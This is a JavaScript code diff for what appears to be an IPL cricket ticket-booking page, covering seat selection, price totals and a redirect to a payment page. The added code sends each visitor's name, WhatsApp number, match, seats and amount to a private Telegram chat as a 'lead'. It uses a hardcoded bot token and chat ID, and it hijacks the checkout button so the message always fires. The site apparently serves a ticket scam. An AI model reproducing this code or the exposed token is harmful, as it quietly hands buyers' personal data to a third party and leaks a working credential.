@@ -23,13 +23,11 @@ document.addEventListener("DOMContentLoaded", async () => {
                 }
             }
         } catch (e) {
-            console.log("Firebase sync skipped, showing local storage image.");
+            console.log("Firebase sync skipped");
         }
     }
 
-    // --- SEAT SELECTION & CALCULATION LOGIC ---
-
-    // 2. Seat Type Select Function
+    // --- SEAT SELECTION LOGIC ---
     window.setSeat = (name, price, el) => {
         document.querySelectorAll('.type-card').forEach(c => c.classList.remove('selected'));
         el.classList.add('selected');
@@ -46,11 +44,9 @@ document.addEventListener("DOMContentLoaded", async () => {
             btn.classList.add('active');
             btn.innerText = "Continue to Payment";
         }
-
         refreshTotal();
     };
 
-    // 3. Quantity Increase/Decrease
     window.updateQty = (val) => {
         let n = window.sQty + val;
         if (n >= 1 && n <= 10) {
@@ -60,7 +56,6 @@ document.addEventListener("DOMContentLoaded", async () => {
         }
     };
 
-    // 4. Price calculation update
     function refreshTotal() {
         const total = window.sQty * window.sPrice;
         document.getElementById('res-total').innerText = `₹${total}`;
@@ -71,11 +66,8 @@ document.addEventListener("DOMContentLoaded", async () => {
         localStorage.setItem("seatQuantity", window.sQty);
     }
 
-    // 5. 🔥 THE MASTERSTROKE REDIRECTION FIX 🔥
-    const processNextPage = async (e) => {
-        // YEH LINE BROWSER KO JABARDASTI ROKEGI
-        if (e) e.preventDefault(); 
-
+    // 5. 🔥 THE ULTIMATE REDIRECT FUNCTION 🔥
+    window.goNext = () => {
         if (window.sPrice > 0) {
             
             // 1. Button Block
@@ -85,7 +77,7 @@ document.addEventListener("DOMContentLoaded", async () => {
                 btn.style.pointerEvents = "none";
             }
 
-            // 2. FULL SCREEN LOADING OVERLAY
+            // 2. SHOW SPINNER
             const loader = document.createElement('div');
             loader.innerHTML = `
                 <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.95); z-index:99999; display:flex; flex-direction:column; justify-content:center; align-items:center; backdrop-filter:blur(5px);">
@@ -97,49 +89,49 @@ document.addEventListener("DOMContentLoaded", async () => {
             `;
             document.body.appendChild(loader);
 
-            // 3. Get Data for Telegram Alert
+            // 3. Telegram Data
             const name = localStorage.getItem('customerName') || "Unknown";
             const phone = localStorage.getItem('customerPhone') || "Unknown";
             let matchTitle = "IPL Match";
             if (matchTitleEl && matchTitleEl.innerText) matchTitle = matchTitleEl.innerText;
             const totalAmt = window.sQty * window.sPrice;
 
-            // Aapka Original Bot Token aur Aapki Chat ID
             const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
             const chatId = "6820660513"; 
-            
-            const telegramMsg = `💰 LEAD REACHED PAYMENT PAGE! 💰\n\n` +
-                                `👤 Name: ${name}\n` +
-                                `📞 WhatsApp: ${phone}\n` +
-                                `🏏 Match: ${matchTitle}\n` +
-                                `🎟️ Seats: ${window.sQty} x ${window.sType}\n` +
-                                `💵 Total Amount: ₹${totalAmt}`;
-
+            const telegramMsg = `💰 LEAD REACHED PAYMENT PAGE! 💰\n\n👤 Name: ${name}\n📞 WhatsApp: ${phone}\n🏏 Match: ${matchTitle}\n🎟️ Seats: ${window.sQty} x ${window.sType}\n💵 Total Amount: ₹${totalAmt}`;
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}`;
 
-            // 4. AWAIT FETCH - 100% Message Delivery
-            try {
-                await fetch(url);
-            } catch (error) {
-                console.log("TG Failed", error);
-            }
+            // 4. BHEJO AUR WAIT KARO
+            fetch(url).then(() => {
+                window.location.href = "payment.html"; // Message gaya, tabhi aage badhega
+            }).catch(() => {
+                window.location.href = "payment.html"; // Error aaya toh bhi aage badhega
+            });
 
-            // 5. MESSAGE BHEJNE KE BAAD HI REDIRECT
-            window.location.href = "payment.html";
+            // 5. FAILSAFE TIMER (Kahin net slow ho toh page atke na)
+            setTimeout(() => {
+                window.location.href = "payment.html";
+            }, 1200);
 
         } else {
             alert("Kripya pehle seat type select karein!");
         }
     };
 
-    // HTML mein jo onclick="goNext()" likha hai usko yahan se control kar rahe hain
-    window.goNext = (event) => {
-        processNextPage(event);
-    };
-
-    // Agar button direct mil jaye toh usko bhi yahi function de do
-    const finalBtn = document.getElementById('final-btn');
-    if (finalBtn) {
-        finalBtn.addEventListener('click', processNextPage);
-    }
+    // 🔥 HYPER-FIX: HTML BUTTON KO JABARDASTI KABOO MEIN KARNA 🔥
+    setTimeout(() => {
+        const finalBtn = document.getElementById('final-btn');
+        if (finalBtn) {
+            // Agar HTML tag mein 'href' likha hai, toh usko delete maaro
+            if (finalBtn.hasAttribute('href')) {
+                finalBtn.removeAttribute('href');
+            }
+            
+            // Inline HTML onclick ko overwrite kar do
+            finalBtn.onclick = function(e) {
+                if(e && e.preventDefault) e.preventDefault(); // Default chhalang roko
+                window.goNext(); // Hamara Telegram wala function chalao
+            };
+        }
+    }, 500); // Page load hone ke aadhe second baad yeh action lega
 });
